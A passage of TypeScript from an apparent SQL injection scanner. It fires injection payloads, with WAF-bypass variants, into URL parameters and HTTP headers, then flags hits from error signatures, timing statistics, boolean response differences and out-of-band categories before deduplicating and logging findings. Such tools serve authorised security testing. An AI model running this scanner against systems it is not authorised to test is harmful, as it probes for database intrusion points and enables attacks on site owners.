                        if (confidence >= 0.25) {
                            const finding = createFinding({
                                url: form.action, parameter: inputField.name, method: form.method,
                                attackSurface: "form", detectionMethod: "BOOLEAN_BASED",
                                payload: truePayload, bypass: BypassTechnique.NONE, dbHint: "unknown",
                                confidence, hasSqlErrors: false, errorSignatures: [], errorWeight: 0,
                                timeDelayDetected: false, timeDelaySeconds: 0, timingZScore: 0, timingPValue: 1,
                                isBooleanPositive: true, oobInteractionId: "",
                                contentDiff: diffTrueFalse,
                                baselineLength: baseLen, testLength: trueLen,
                                baselineTime: baseline?.mean || 0, testTime: trueResp.elapsed,
                                rawResponseSnippet: trueResp.text.slice(0, 400), formData,
                            });
                            allFindings.push(finding);
                            log(`    ▸ BOOLEAN CONFIRMED: ${finding.severity} CVSS:${finding.cvssScore} — ${inputField.name} TRUE/FALSE diff=${diffTrueFalse.toFixed(1)}%`);
                        }
                    }
                } catch (e: any) {
                    log(`    [ERROR] Boolean test ${inputField.name}: ${e.message}`);
                }

                testIndex++;
                await sleep(config.requestDelay * 500);
            }
        }
    }

    // ─────────────────────────────────────────────────
    // Phase 4: URL Parameter Testing
    // ─────────────────────────────────────────────────
    onProgress("Phase 4: Testing URL parameters", 62);
    log(`── Phase 4: Testing URL parameters (${params.length} params) ──`);

    const PARAM_PROGRESS_START = 62;
    const PARAM_PROGRESS_END = 87;
    let paramIndex = 0;

    for (const param of params) {
        const baselineKey = `param:${param.baseUrl}:${param.name}`;
        const baseline = baselines.get(baselineKey);
        log(`  Testing URL param: "${param.name}" on ${param.baseUrl.slice(0, 60)} priority=${param.priority}`);

        // Non-boolean tests
        for (const basePayload of nonBooleanPayloads) {
            const variants = generatePolymorphicVariants(basePayload, basePayload.category === "time_based");

            for (const { payload, bypass } of variants) {
                try {
                    const testUrl = new URL(param.baseUrl);
                    if (param.allParams) {
                        for (const [k, v] of Object.entries(param.allParams)) {
                            testUrl.searchParams.set(k, k === param.name ? payload.value : v);
                        }
                    } else {
                        testUrl.searchParams.set(param.name, payload.value);
                    }

                    const start = performance.now();
                    const resp = await fetch(testUrl.toString(), { headers: authHeaders, redirect: "follow", signal: AbortSignal.timeout(15000) });
                    const elapsed = (performance.now() - start) / 1000;
                    const text = await resp.text();

                    const { found: hasErrors, signatures, dbHint, totalWeight: errorWeight } = checkErrorSignatures(text);
                    const contentDiff = baseline ? (Math.abs(text.length - baseline.length) / (baseline.length || 1)) * 100 : 0;
                    const statusChanged = baseline ? (resp.status >= 500 && baseline.status < 400) : false;
                    const zScore = baseline ? computeZScore(elapsed, baseline.mean, baseline.stddev) : 0;
                    const isTimeBased = payload.category === "time_based" && elapsed > config.timeThreshold && zScore >= 2.5;

                    let detMethod = "";
                    if (hasErrors && errorWeight >= 2) detMethod = "ERROR_BASED";
                    else if (isTimeBased && zScore >= 2.5) detMethod = "TIME_BASED_STATISTICAL";
                    else if (payload.category === "union_probe" && contentDiff > 5) detMethod = "UNION_PROBE";
                    else if (payload.category === "stacked_query" && (isTimeBased || hasErrors)) detMethod = "STACKED_QUERY";
                    else if (payload.category === "oob_dns") detMethod = "OOB_DNS";
                    else if (payload.category === "oob_http") detMethod = "OOB_HTTP";
                    else if (statusChanged) detMethod = "STATUS_CODE_ANOMALY";
                    else if (contentDiff > 20) detMethod = "CONTENT_DIFF";

                    if (!detMethod) { paramIndex++; await sleep(config.requestDelay * 500); continue; }

                    const confidence = scoreConfidence({
                        hasErrors, errorWeight, timeDelay: isTimeBased, timingZScore: zScore,
                        oobId: detMethod.startsWith("OOB") ? "oob-injected" : "",
                        booleanConfirmed: false, contentDiff,
                        testStatus: resp.status, baselineStatus: baseline?.status || 200,
                        signatures, dbHint,
                    });

                    const MIN_CONFIDENCE: Record<string, number> = {
                        ERROR_BASED: 0.40, TIME_BASED_STATISTICAL: 0.45, UNION_PROBE: 0.20,
                        STACKED_QUERY: 0.40, OOB_DNS: 0.50, OOB_HTTP: 0.50,
                        STATUS_CODE_ANOMALY: 0.15, CONTENT_DIFF: 0.30,
                    };

                    if (confidence < (MIN_CONFIDENCE[detMethod] || 0.25)) {
                        paramIndex++;
                        await sleep(config.requestDelay * 500);
                        continue;
                    }

                    const finding = createFinding({
                        url: param.baseUrl, parameter: param.name, method: "GET",
                        attackSurface: "url-param", detectionMethod: detMethod,
                        payload, bypass, dbHint, confidence,
                        hasSqlErrors: hasErrors, errorSignatures: signatures, errorWeight,
                        timeDelayDetected: isTimeBased, timeDelaySeconds: elapsed,
                        timingZScore: zScore, timingPValue: zScore >= 3 ? 0.001 : 0.05,
                        isBooleanPositive: null, oobInteractionId: detMethod.startsWith("OOB") ? "pending-verification" : "",
                        contentDiff, baselineLength: baseline?.length || 0, testLength: text.length,
                        baselineTime: baseline?.mean || 0, testTime: elapsed,
                        rawResponseSnippet: text.slice(0, 400),
                    });

                    allFindings.push(finding);
                    log(`    ▸ FINDING: ${finding.severity} CVSS:${finding.cvssScore} conf:${(finding.confidence * 100).toFixed(0)}% ${detMethod} — ${param.name} via ${bypass}`);
                } catch (e: any) {
                    log(`    [ERROR] ${param.name}: ${e.message}`);
                }

                paramIndex++;
                onProgress(`Phase 4: Testing URL params [${paramIndex}]`, Math.min(PARAM_PROGRESS_START + (paramIndex / 400) * (PARAM_PROGRESS_END - PARAM_PROGRESS_START), PARAM_PROGRESS_END));
                await sleep(config.requestDelay * 500);
            }
        }

        // Boolean pair testing for URL params
        for (const truePayload of booleanTruePayloads) {
            if (!truePayload.booleanPair) continue;

            try {
                const buildUrl = (val: string) => {
                    const u = new URL(param.baseUrl);
                    if (param.allParams) {
                        for (const [k, v] of Object.entries(param.allParams)) {
                            u.searchParams.set(k, k === param.name ? val : v);
                        }
                    } else {
                        u.searchParams.set(param.name, val);
                    }
                    return u.toString();
                };

                const trueResp = await fetch(buildUrl(truePayload.value), { headers: authHeaders, redirect: "follow", signal: AbortSignal.timeout(15000) });
                const trueText = await trueResp.text();
                await sleep(config.requestDelay * 300);
                const falseResp = await fetch(buildUrl(truePayload.booleanPair!), { headers: authHeaders, redirect: "follow", signal: AbortSignal.timeout(15000) });
                const falseText = await falseResp.text();

                const baseLen = baseline?.length || 0;
                const diffTrueFalse = baseLen > 0
                    ? Math.abs(trueText.length - falseText.length) / baseLen * 100
                    : Math.abs(trueText.length - falseText.length) / (Math.max(trueText.length, falseText.length) || 1) * 100;

                const booleanConfirmed = diffTrueFalse > 5 && (
                    (baseline && Math.abs(trueText.length - baseline.length) > 10) ||
                    (baseline && Math.abs(falseText.length - baseline.length) > 10) ||
                    Math.abs(trueText.length - falseText.length) > 50
                );

                if (booleanConfirmed) {
                    const confidence = scoreConfidence({
                        hasErrors: false, errorWeight: 0, timeDelay: false, timingZScore: 0,
                        oobId: "", booleanConfirmed: true, contentDiff: diffTrueFalse,
                        testStatus: trueResp.status, baselineStatus: baseline?.status || 200,
                        signatures: [], dbHint: "unknown",
                    });

                    if (confidence >= 0.25) {
                        const finding = createFinding({
                            url: param.baseUrl, parameter: param.name, method: "GET",
                            attackSurface: "url-param", detectionMethod: "BOOLEAN_BASED",
                            payload: truePayload, bypass: BypassTechnique.NONE, dbHint: "unknown",
                            confidence, hasSqlErrors: false, errorSignatures: [], errorWeight: 0,
                            timeDelayDetected: false, timeDelaySeconds: 0, timingZScore: 0, timingPValue: 1,
                            isBooleanPositive: true, oobInteractionId: "",
                            contentDiff: diffTrueFalse, baselineLength: baseLen, testLength: trueText.length,
                            baselineTime: baseline?.mean || 0, testTime: 0,
                            rawResponseSnippet: trueText.slice(0, 400),
                        });
                        allFindings.push(finding);
                        log(`    ▸ BOOLEAN CONFIRMED: ${finding.severity} CVSS:${finding.cvssScore} — ${param.name} diff=${diffTrueFalse.toFixed(1)}%`);
                    }
                }
            } catch (e: any) {
                log(`    [ERROR] Boolean ${param.name}: ${e.message}`);
            }
            paramIndex++;
            await sleep(config.requestDelay * 500);
        }
    }

    // ─────────────────────────────────────────────────
    // Phase 5: Header Injection Testing
    // ─────────────────────────────────────────────────
    onProgress("Phase 5: Testing HTTP header injection", 88);
    log(`── Phase 5: Header Injection Testing ──`);

    if (config.testAllHeaders) {
        for (const headerName of INJECTABLE_HEADERS) {
            log(`  Testing header: ${headerName}`);
            const headerBaseline = await (async () => {
                try {
                    const start = performance.now();
                    const resp = await fetch(target, { headers: { ...authHeaders }, redirect: "follow", signal: AbortSignal.timeout(10000) });
                    const text = await resp.text();
                    return { status: resp.status, length: text.length, mean: (performance.now() - start) / 1000, stddev: 0.1 };
                } catch { return null; }
            })();

            for (const payload of HEADER_INJECTION_PAYLOADS) {
                try {
                    const testHeaders = { ...authHeaders, [headerName]: payload.value };
                    const start = performance.now();
                    const resp = await fetch(target, { headers: testHeaders, redirect: "follow", signal: AbortSignal.timeout(15000) });
                    const elapsed = (performance.now() - start) / 1000;
                    const text = await resp.text();

                    const { found: hasErrors, signatures, dbHint, totalWeight: errorWeight } = checkErrorSignatures(text);
                    const contentDiff = headerBaseline ? (Math.abs(text.length - headerBaseline.length) / (headerBaseline.length || 1)) * 100 : 0;
                    const zScore = headerBaseline ? computeZScore(elapsed, headerBaseline.mean, headerBaseline.stddev) : 0;
                    const isTimeBased = payload.category === "header_injection" && elapsed > config.timeThreshold && zScore >= 2.5 && payload.value.includes("SLEEP");

                    let detMethod = "";
                    if (hasErrors && errorWeight >= 2) detMethod = "ERROR_BASED";
                    else if (isTimeBased) detMethod = "TIME_BASED_STATISTICAL";
                    if (!detMethod) { await sleep(config.requestDelay * 500); continue; }

                    const confidence = scoreConfidence({
                        hasErrors, errorWeight, timeDelay: isTimeBased, timingZScore: zScore,
                        oobId: "", booleanConfirmed: false, contentDiff,
                        testStatus: resp.status, baselineStatus: headerBaseline?.status || 200,
                        signatures, dbHint,
                    });

                    if (confidence >= 0.40) {
                        const headerPayload: Payload = { ...payload, value: payload.value };
                        const finding = createFinding({
                            url: target, parameter: headerName, method: "GET",
                            attackSurface: "header", detectionMethod: detMethod,
                            payload: headerPayload, bypass: BypassTechnique.NONE, dbHint, confidence,
                            hasSqlErrors: hasErrors, errorSignatures: signatures, errorWeight,
                            timeDelayDetected: isTimeBased, timeDelaySeconds: elapsed,
                            timingZScore: zScore, timingPValue: zScore >= 3 ? 0.001 : 0.05,
                            isBooleanPositive: null, oobInteractionId: "",
                            contentDiff, baselineLength: headerBaseline?.length || 0, testLength: text.length,
                            baselineTime: headerBaseline?.mean || 0, testTime: elapsed,
                            rawResponseSnippet: text.slice(0, 400),
                        });
                        allFindings.push(finding);
                        log(`    ▸ HEADER FINDING: ${finding.severity} CVSS:${finding.cvssScore} — ${headerName}`);
                    }
                } catch (e: any) {
                    log(`    [ERROR] Header ${headerName}: ${e.message}`);
                }
                await sleep(config.requestDelay * 500);
            }
        }
    } else {
        log(`  Header injection testing disabled (enable 'Test HTTP Headers' option)`);
    }

    // ─────────────────────────────────────────────────
    // Phase 6: Deduplication & Final Report
    // ─────────────────────────────────────────────────
    onProgress("Phase 6: Deduplicating and scoring findings", 95);
    log(`── Phase 6: Deduplication ──`);
    log(`  Raw findings before dedup: ${allFindings.length}`);

    const findings = deduplicateFindings(allFindings);

    log(`  Findings after dedup: ${findings.length}`);
    log(`═══ Scan Complete ═══`);
    log(`Total confirmed findings: ${findings.length}`);

    const critCount = findings.filter(f => f.severity === "Critical").length;
    const highCount = findings.filter(f => f.severity === "High").length;
    const medCount = findings.filter(f => f.severity === "Medium").length;
    const lowCount = findings.filter(f => f.severity === "Low").length;
    log(`  Critical: ${critCount} | High: ${highCount} | Medium: ${medCount} | Low: ${lowCount}`);

    onProgress("Complete", 100);

    return {
        findings,
        scanLog,
        enumeration: {
            formsFound: forms.length,
            paramsFound: params.length,
            pathsDiscovered: discoveredPaths.length,
            techStack,
        },
    };
}

// ─── Utility Functions ───

function simpleHash(str: string): string {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        hash = ((hash << 5) - hash) + str.charCodeAt(i);
        hash |= 0;
    }
    return hash.toString(16);
}

function sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
}
